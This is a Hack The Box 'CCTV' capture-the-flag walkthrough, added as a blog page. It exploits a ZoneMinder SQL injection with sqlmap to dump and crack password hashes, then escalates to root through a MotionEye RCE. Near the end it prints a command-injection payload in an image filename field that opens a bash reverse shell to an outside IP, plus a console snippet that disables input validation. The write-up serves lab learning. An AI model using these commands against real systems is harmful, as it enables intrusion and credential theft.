@@ -1,0 +1,219 @@
+export const frontmatter = {
+  title: "Hack The Box CCTV Machine Writeup",
+  slug: "hack-the-box-cctv-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box CCTV machine, covering ZoneMinder SQL injection, credential extraction, SSH access, MotionEye authentication bypass, remote code execution, and privilege escalation to root.",
+  date: "2026-07-12",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box CCTV Writeup | ZoneMinder SQLi, MotionEye RCE & Privilege Escalation | loxcalhost",
+  description:
+    "Step-by-step Hack The Box CCTV writeup demonstrating exploitation of ZoneMinder authenticated SQL injection (CVE-2024-51482), password hash extraction and cracking, SSH foothold, MotionEye authentication bypass using the stored password hash, exploitation of MotionEye RCE (CVE-2025-60787), and root access.",
+};
+
+## Introduction
+
+CCTV focuses on web application enumeration and chaining multiple vulnerabilities for full compromise. Starting with basic reconnaissance, we discover a ZoneMinder instance vulnerable to SQL injection, leading to credential extraction and SSH access. Further privilege escalation is achieved by exploiting a misconfigured MotionEye service, ultimately resulting in remote code execution
+
+## Setup
+
+Grab IP address from the Machine page, and edit the hosts file under `/etc/hosts` to add a line `<ip_addr> cctv.htb` this is done because local system could resolve the domain name to the target machine. The target web server may use virtual host configuration, meaning it serves the intended application only when the correct hostname is provided in the HTTP request
+
+Now download a VPN configuration file from webpage and connect to it via `sudo openvpn file.ovpn`
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name
+
+To check if everything is working fine, we can use `ping <ip_addr>`
+
+## Enumeration
+
+Perform a Nmap scan with version detection with: `nmap -sV <ip_addr>`
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 17:05 IST
+Nmap scan report for cctv.htb (10.129.253.113)
+Host is up (0.77s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58
+Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.79 seconds
+```
+
+This shows we have a SSH server and a web server running on target
+
+Visiting `10.129.3.41` redirects to web app on `http://cctv.htb`
+
+Navigating `http://cctv.htb` revels a staff login page for Zoneminder and trying common credentials such as `admin:admin` makes our way in 
+
+The dashboard upon login revels that zoneminder is running on v1.37.63
+
+A quick google search shows us that it is vulnerable to authenticated [blind SQL injection](https://github.com/plur1bu5/CVE-2024-51482-PoC)
+
+With `sqlmap` we can exploit it as 
+```
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
+-p tid \
+--cookie="addMonitorsip=; ZMSESSID=2niijadnqk52i3aohbct4aj5u7; zmLogsTable.bs.table.sortName=Message; zmSkin=classic; AddMonitorsTable.bs.table.pageNumber=1; zmHeaderFlip=up; zmCSS=base; zmLogsTable.bs.table.sortOrder=desc" \
+--dbs
+```
+
+> **NOTE:** Remember to replace you *cookie*, either form network tab or using [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) on firefox or [Cookie Editor](https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm) on chrome
+
+which returns that `tid=` is vulnerable to time-based blind injection
+
+and sqlmap returns 
+```
+available databases [3]:
+[*] information
+[*] performance_schema
+[*] zm
+```
+
+intersting one being `zm`
+
+To list all tables in `zm` database use
+```bash
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
+-p tid \
+--cookie="addMonitorsip=; ZMSESSID=2niijadnqk52i3aohbct4aj5u7; zmLogsTable.bs.table.sortName=Message; zmSkin=classic; AddMonitorsTable.bs.table.pageNumber=1; zmHeaderFlip=up; zmCSS=base; zmLogsTable.bs.table.sortOrder=desc" \
+-D zm --tables
+```
+
+which returns
+
+```
+Database: zm
+[43 tables]
++----------------------+
+| Config               |
+...<SNIP>...
+| Users                |
+...<SNIP>...
+| User_Pref\x81rences  |
++----------------------+
+```
+
+> **NOTE:** This may take enormous amount of time due to it's functionality, **BE PATIENT** 
+
+The interesting table being the `Users`, check out [this](https://forums.zoneminder.com/viewtopic.php?p=1038#p1038) to know why
+
+Tump `Users` table from `zm` database use:
+```bash
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
+-p tid \
+--cookie="addMonitorsip=; ZMSESSID=2niijadnqk52i3aohbct4aj5u7; zmLogsTable.bs.table.sortName=Message; zmSkin=classic; AddMonitorsTable.bs.table.pageNumber=1; zmHeaderFlip=up; zmCSS=base; zmLogsTable.bs.table.sortOrder=desc" \
+-D zm -T Users --dump
+```
+
+Which gives us:
+```
+Table: Users
+[3 entries]
++----+---------+---------+---------+---------+---------+---------+----------+----------+--------------------+------------+----------+----------+----------+----------+-----------+------------+------------+--------------+----------------+
+| Id | Email   | Phone   | Name    | Control | Devices | Enabled | HomeView | Monitors | Password           | Username   | Events   | Groups   | Stream   | System   | Snapshots | APIEnabled | Language   | MaxBandwidth | TokenMinExpiry |
++----+---------+---------+---------+---------+---------+---------+----------+----------+--------------------+------------+----------+----------+----------+----------+-----------+------------+------------+--------------+----------------+
+| 1  | <blank> | <blank> | <blank> | Edit    | Edit    | 1       | console  | Create   | $2y...<SINP>...tbm | superadmin | Edit     | Edit     | View     | Edit     | Edit      | 1          | <blank>    | <blank>      | 0              |
+| 2  | <blank> | <blank> | mark    | Edit    | Edit    | 1       | console  | Create   | $2y...<SINP>...FG. | mark       | Edit     | Edit     | View     | View     | <blank>   | 1          | <blank>    | <blank>      | 0              |
+| 3  | <blank> | <blank> | admin   | Edit    | Edi     | 1       | console  | Create   | $2y...<SINP>...M6m | admin      | Edit     | Edit     | View     | View     | <blank>   | 1          | <blank>    | <blank>      | 0              |
++----+---------+---------+---------+---------+---------+---------+----------+----------+--------------------+------------+----------+----------+----------+----------+-----------+------------+------------+--------------+----------------+
+```
+
+We find 3 interesting password hash which we can try to crack with `john`
+
+Save hashes with:
+```bash
+echo "$2y...<SINP>...tbm" > hashes.txt
+echo "$2y...<SINP>...FG." >> hashes.txt
+echo "$2y...<SINP>...M6m" >> hashes.txt
+```
+
+> **NOTE:** While adding hashes to `hashes.txt` do not forget to replace with your original hash value
+
+To crack the hash with john use:
+```bash
+john hashes.txt --wordlist=wordlist.txt
+```
+Here:
+- `hashes.txt` is file where hashes are saved
+- `wordlist.txt` is your wordlist to crack the hash
+
+Once completed check with `john --show hashes.txt` which would have probably cracked the hash for user `mark`
+
+## Foothold 
+
+Our initial Nmap scan showed that it was running a `SSH` so we can connect to it with `ssh mark@<ip_addr>` and when prompted enter the password
+
+> **NOTE:** Replace `<ip_addr>` with the one which you got form the HTB Machine Page
+
+We have successfully connected to SSH we can continue our further enumeration 
+
+## Internal Enumeration 
+
+Download `linpeas.sh` with `curl -L -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`
+
+To import it to remote SSH server run `nc <attcker_ip> 4444 > linpeas.sh` on SSH server and on attacker machine run `nc -lvnp 4444 < linpeas.sh`
+
+> **NOTE:** Replace `<attacker_ip>` with the IP address shown in `eth0` interface when you use `ip a` in terminal
+
+> **NOTE:** It can be noisy in real word environment to use `linpeas.sh`, use with caution 
+
+Make the file executable on server with `chmod +x linpeas.sh`
+
+Run it with `sh linpeas.sh > output`
+
+Upon analyzing the `output` we find two possible techniques one being the kernel and other being `motioneye` service running as a root
+
+> **NOTE:** We will not be working with kernel, because it may cause system instability 
+
+Motioneye common runs on port `8765` and listens locally on target we use SSH local port forwarding to access it from our machine `ssh -L 8765:127.0.0.1:8765 mark@<machine_ip>`
+
+*Command Breakdown:*
+- `8765:127.0.0.1:8765` here first `8765` corresponds to local port, `127.0.0.1` corresponds to remote host and `8765` corresponds to remote port, basically you connect to `localhost:8765` on your machine, and SSH forwards that traffic to `127.0.0.1:8765` on the remote machine
+- `mark@<machine_ip>` here mark is username and `<machine_ip>` corresponds to the IP address you get when you start the machine
+
+Generally configuration files on linux are stored in `/etc/` we can check for configuration file with `find /etc -name "*.conf" 2>/dev/null | grep motioneye` which returns
+```
+./etc/motioneye/camera-1.conf
+./etc/motioneye/motion.conf
+./etc/motioneye/motioneye.conf
+```
+
+Upon viewing contents of `cat /etc/motioneye/motion.conf` it shows, it contains `admin_password` in form of a hash
+
+Visit `http://127.0.0.1:8765/` and upon trying to login with `admin:hash` we were successfully logged in to dashboard
+
+> **NOTE:** We did not crack the password hash because, due to the sloppy nature of some software, it may sometimes accept a password hash directly
+
+Source code of website revels that it's running on `v0.43.1b4`
+
+A quick google search revels that it is vulnerable to a RCE which has been assigned [CVE-2025-60787](https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter)
+
+## Privilege Escalation
+
+Under `Still Images` section in Image File Name replace the existing one with `$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.20/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S`
+
+> **NOTE:** Replace `<ip_addr>` with the IP address from `tun0`
+
+and click apply, but it will give us a error, because web interface uses client-side validation to prevent special characters
+
+To bypass this, open your browser’s **Developer Tools (F12)**, navigate to the Console tab, and execute the following snippet to disable the validation:
+```
+configUiValid = function() { 
+    return true; 
+};
+```
+On attacker machine start netcat listener with `nc -lvnp 4444`
+
+Which will successfully give a reverse shell connection
+
+## Post-Exploitation
+
+To grab the user flag use `cat /home/sa_mark/user.txt`
+
+And to grab the root flag use `cat /root/root.txt`
